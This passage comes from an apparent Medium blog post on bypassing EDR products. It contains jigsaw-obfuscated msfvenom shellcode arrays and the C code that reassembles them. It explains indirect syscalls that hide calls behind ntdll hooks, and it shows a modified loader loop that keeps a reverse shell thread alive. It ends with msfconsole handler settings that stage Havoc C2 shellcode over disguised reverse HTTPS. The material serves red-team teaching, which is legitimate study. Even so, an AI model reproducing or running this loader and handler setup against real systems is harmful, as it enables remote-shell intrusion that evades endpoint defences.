class="hljs-number">155</span>, <span class="hljs-number">296</span>, <span class="hljs-number">781</span>, <span class="hljs-number">553</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">538</span>, <span class="hljs-number">69</span>, <span class="hljs-number">703</span>, <span class="hljs-number">68</span>, <span class="hljs-number">701</span>, <span class="hljs-number">391</span>, <span class="hljs-number">369</span>, <span class="hljs-number">463</span>, <span class="hljs-number">205</span>, <span class="hljs-number">660</span>, <span class="hljs-number">48</span>, <span class="hljs-number">519</span>, <span class="hljs-number">370</span>, <span class="hljs-number">597</span>, <span class="hljs-number">425</span>, <span class="hljs-number">131</span>, <span class="hljs-number">492</span>, <span class="hljs-number">214</span>, <span class="hljs-number">354</span>, <span class="hljs-number">786</span>, <span class="hljs-number">623</span>, <span class="hljs-number">307</span>, <span class="hljs-number">53</span>, <span class="hljs-number">71</span>, <span class="hljs-number">731</span>, <span class="hljs-number">192</span>, <span class="hljs-number">694</span>, <span class="hljs-number">308</span>, <span class="hljs-number">464</span>, <span class="hljs-number">38</span>, <span class="hljs-number">818</span>, <span class="hljs-number">145</span>, <span class="hljs-number">736</span>, <span class="hljs-number">267</span>, <span class="hljs-number">357</span>, <span class="hljs-number">121</span>, <span class="hljs-number">761</span>, <span class="hljs-number">510</span>, <span class="hljs-number">431</span> };<br><br><br><span class="hljs-type">int</span> calc_len = <span class="hljs-number">826</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> calc_payload[<span class="hljs-number">826</span>] = { <span class="hljs-number">0x00</span> };<br><span class="hljs-type">int</span> position;<br><br><span class="hljs-comment">// Reconstruct the payload</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>; idx &lt; <span class="hljs-keyword">sizeof</span>(positions) / <span class="hljs-keyword">sizeof</span>(positions[<span class="hljs-number">0</span>]); idx++) {<br>        position = positions[idx];<br>        calc_payload[position] = jigsaw[idx];<br>}</span></pre><h2 id="99f9" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Obfuscating through Indirect Syscalls</h2><p id="0288" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">On the EDR side (which may be hooked into DLLs like ntdll.dll) we can use indirect syscalls to make it looks like, for example, a call originated from NT API NtAllocateVirtualMemory instead of our shellcode loader PE so we would look normal if the EDR’s kernel mode driver inspects the callstack as well. Using indirect system calls involves directly invoking system call entry points in the Windows Native API (NTAPI) by their system call numbers, rather than going through the Windows API functions that wrap these calls. Most EDRs write their hooks at the start of the Nt function, overwriting the SSN but leaving the syscall instruction intact. This allows us to utilize the syscall instructions already provided by ntdll instead of bringing our own. We can just set up the r10 and eax registers ourselves (below), then jump to the syscall instruction inside the hooked ntdll function (which comes after the EDR’s hook). As stated previously, the author said “The methods used to load and execute the shellcode would also present opportunities for detection”. however, indirect syscalls may be able to bypass detection from EDRs that are looking at the first return address for the syscall, which we can make to look like it came from ntdll.dll, not our malicious code as seen below.</p><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div class="pr ps rb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 1100w, https://miro.medium.com/v2/resize:fit:1210/format:webp/1*qolCWQAQoHpVt8q1E4CQiA.png 1210w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 605px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*qolCWQAQoHpVt8q1E4CQiA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*qolCWQAQoHpVt8q1E4CQiA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*qolCWQAQoHpVt8q1E4CQiA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*qolCWQAQoHpVt8q1E4CQiA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*qolCWQAQoHpVt8q1E4CQiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*qolCWQAQoHpVt8q1E4CQiA.png 1100w, https://miro.medium.com/v2/resize:fit:1210/1*qolCWQAQoHpVt8q1E4CQiA.png 1210w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 605px"><img alt="" class="bi mn pz c" width="605" height="199" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:605/1*qolCWQAQoHpVt8q1E4CQiA.png"></picture></div></figure><p id="bf89" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">We’re going to use this fairly new shellcode loader resource below from GitHub to put our obfuscated shellcode (jiggsaw.txt file) in ShellcodeLoader.c.</p><div class="qa qb qc qd qe qf"><a href="https://github.com/0xcf80/ShellCodeLoader_Indirect_Syscalls?source=post_page-----bb589148e56f---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qg ac cb"><div class="qh ac cv ci cd qi"><h2 class="bg hm qj ab ga qk ql qm qn qo qp hk bl">GitHub - 0xcf80/ShellCodeLoader_Indirect_Syscalls: Shellcode Loader using indirect syscalls</h2><div class="qz m"><h3 class="bg b qj ab ga qk ql qm qn qo qp eb">Shellcode Loader using indirect syscalls. Contribute to 0xcf80/ShellCodeLoader_Indirect_Syscalls development by…</h3></div><div class="qq m"><p class="bg b ec ab ga qk ql qm qn qo qp eb">github.com</p></div></div><div class="qr m"><div class="wx m qt qu qv qr qw mn qf"></div></div></div></a></div><blockquote class="rd re rf"><p id="be57" class="ng nh rg ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">You can skip to the next section unless you want to know what I changed, I’m going to include the revised code on my Github <a class="ah rh" href="https://github.com/srothlisberger6361/ShellCodeLoader_Indirect_Syscalls/tree/main" rel="noopener ugc nofollow" target="_blank">here </a>so you really just need to change <strong class="ni hm">unsigned char shellcode_int3</strong>, <strong class="ni hm">unsigned char jigsaw, int positions</strong>, and <strong class="ni hm">int calc_len</strong> within ShellcodeLoader.c if you want to try this yourself!</p></blockquote><p id="c7db" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">First, completely delete shellcode.h. We can put everything in the ShellcodeLoader.c. We need to swap the NtWaitForSingleObject API call function here:</p></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps rn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*IYrfL1wFs4dzYEiqm95c2g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*IYrfL1wFs4dzYEiqm95c2g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*IYrfL1wFs4dzYEiqm95c2g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*IYrfL1wFs4dzYEiqm95c2g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*IYrfL1wFs4dzYEiqm95c2g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*IYrfL1wFs4dzYEiqm95c2g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*IYrfL1wFs4dzYEiqm95c2g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*IYrfL1wFs4dzYEiqm95c2g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="238" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*IYrfL1wFs4dzYEiqm95c2g.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="0aaf" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">For this code here:</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="32f5" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">// Wait for 1 second &amp; execute</span><br><span class="hljs-type">LARGE_INTEGER</span> <span class="hljs-type">Timeout</span>;<br><span class="hljs-type">Timeout</span>.<span class="hljs-type">QuadPart</span> <span class="hljs-operator">=</span> <span class="hljs-operator">-</span><span class="hljs-number">10000000</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-type">TRUE</span>) {<br>    <span class="hljs-comment">// Prepare for and perform the syscall to wait on the thread</span><br>    <span class="hljs-type">PrepareSyscall</span>(pSyscallTable-&gt;<span class="hljs-type">NtWaitForSingleObject</span>.syscallId, pSyscallTable-&gt;<span class="hljs-type">NtWaitForSingleObject</span>.pSyscall);<br>    status <span class="hljs-operator">=</span> <span class="hljs-type">DoIndirectSyscall</span>(hHostThread, <span class="hljs-type">FALSE</span>, <span class="hljs-operator">&amp;</span><span class="hljs-type">Timeout</span>);<br><br>    <span class="hljs-keyword">if</span> (status <span class="hljs-operator">==</span> <span class="hljs-type">STATUS_WAIT_0</span>) {<br>        <span class="hljs-type">DEBUG_PRINT</span>(<span class="hljs-string">"Reverse shell thread has completed its execution.<span class="hljs-subst">\n</span>"</span>);<br>        <span class="hljs-keyword">break</span>; <span class="hljs-comment">// Exit the loop if the thread has signaled completion</span><br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (status <span class="hljs-operator">==</span> <span class="hljs-type">STATUS_TIMEOUT</span>) {<br>        <span class="hljs-type">DEBUG_PRINT</span>(<span class="hljs-string">"Still executing the reverse shell thread...<span class="hljs-subst">\n</span>"</span>);<br>        <span class="hljs-comment">// The thread is still running; the main program can continue to wait or perform other tasks</span><br>        <span class="hljs-comment">// Optionally, this is a good place to check for other conditions to continue waiting or not</span><br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-type">DEBUG_PRINT</span>(<span class="hljs-string">"NtWaitForSingleObject Failed with status: %x<span class="hljs-subst">\n</span>"</span>, status);<br>        <span class="hljs-keyword">break</span>; <span class="hljs-comment">// An error occurred; handle accordingly</span><br>    }<br>    <span class="hljs-comment">// Adjust the timeout for your next wait period as necessary. </span><br>    <span class="hljs-comment">// This loop will continue to keep the program alive, checking on the thread at each interval.</span><br>}</span></pre></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps rq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*zZzYEUVlTRNejZLflc4sWg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*zZzYEUVlTRNejZLflc4sWg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*zZzYEUVlTRNejZLflc4sWg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*zZzYEUVlTRNejZLflc4sWg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*zZzYEUVlTRNejZLflc4sWg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*zZzYEUVlTRNejZLflc4sWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*zZzYEUVlTRNejZLflc4sWg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*zZzYEUVlTRNejZLflc4sWg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="342" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*zZzYEUVlTRNejZLflc4sWg.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="08b5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">I did this so that the main thread enters a loop where it periodically checks on the reverse shell thread using NtWaitForSingleObject through indirect syscalls. Ultimately, it would be waiting for a signal from the monitored hHostThread to terminate the thread and then the PE. For our case, this makes sure the PE loader doesn't exit after the thread executes because we wouldn't want to get a connection for only 1 second.</p><div class="wy vs wz xa ac r cv"><div class="xb xc xd xe xf m fm"><h2 class="xg b xh xi xj xk xl">Get Sam Rothlisberger’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="xp ue xq xr ud xs ac"><span class="bg b bh ab bl"><div class="xt ac cv"><div class="ac xt fj fi bq xu xv de mb xw xx xy xz ya yb yc"><input class="yd al aj an ye yf gd ln bm yg bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l uu cb"><div class="xm xn xo"><button class="bg b bh ab yh tj yi yj yk yl wc fc fd ym yn yo fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab yh tj yi yj yk yl wc fc fd ym yn yo fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="qz m"><div id="g-recaptcha"></div></div></div><p id="7181" class="pw-post-body-paragraph ng nh hl ni b ij nk nl im nn no np nr ns nt nv nw nx nz oa xa ob he bl" data-selectable-paragraph="">And also add in our jiggsaw msfvenom shellcode obfuscated stub that was generated for us. I change it alittle bit so that the <em class="rg">calc_payload</em> variable is now <em class="rg">shellcode_int3</em>, just because that is what the argument to the function was in <em class="rg">execute_shellcode_create_thread </em>and referenced elsewhere.</p></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps rn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*Kqsrrk6Sm1_R0kXT_iUp-w.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="385" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*Kqsrrk6Sm1_R0kXT_iUp-w.png"></picture></div></div></figure><figure class="ma pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps rr"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*oVUM3AVJGbMJgqRRnvtFIw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*oVUM3AVJGbMJgqRRnvtFIw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*oVUM3AVJGbMJgqRRnvtFIw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*oVUM3AVJGbMJgqRRnvtFIw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*oVUM3AVJGbMJgqRRnvtFIw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*oVUM3AVJGbMJgqRRnvtFIw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*oVUM3AVJGbMJgqRRnvtFIw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*oVUM3AVJGbMJgqRRnvtFIw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="292" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*oVUM3AVJGbMJgqRRnvtFIw.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="4653" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Delivering Havoc C2 stage 2 Shellcode (msfconsole)</h2><p id="906c" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">Similar to my previous post, this stage 1 payload connection using msfvenom is going to download the stage 2 payload connection for Havoc C2 shellcode so we can get some more functionality than we would with just msfvenom. Here’s the options:</p><ul class=""><li id="9d13" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob rs rt ru bl" data-selectable-paragraph="">use multi/handler</li><li id="5229" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set payload windows/x64/custom/reverse_https</li><li id="f893" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set exitfunc thread</li><li id="ea3f" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set lhost &lt;IP ADDR&gt;</li><li id="5c74" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set lport 8443</li><li id="3bbe" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set luri blog.html</li><li id="6631" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set HttpServerName Blogger</li><li id="15e2" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set shellcode_file Havoc.bin</li><li id="9b58" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set exitonsession false</li><li id="4cae" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set HttpHostHeader <a class="ah rh" href="http://www.factbook.com/" rel="noopener ugc nofollow" target="_blank">www.factbook.com</a></li><li id="bf94" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob rs rt ru bl" data-selectable-paragraph="">set HandlerSSLCert <a class="ah rh" href="http://www.google.com.pem/" rel="noopener ugc nofollow" target="_blank">www.google.com.pem</a></li></ul></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps sa"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*d3hmJQ5eEO34zSGxhlJ9HA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*d3hmJQ5eEO34zSGxhlJ9HA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*d3hmJQ5eEO34zSGxhlJ9HA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*d3hmJQ5eEO34zSGxhlJ9HA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*d3hmJQ5eEO34zSGxhlJ9HA.png 786w, 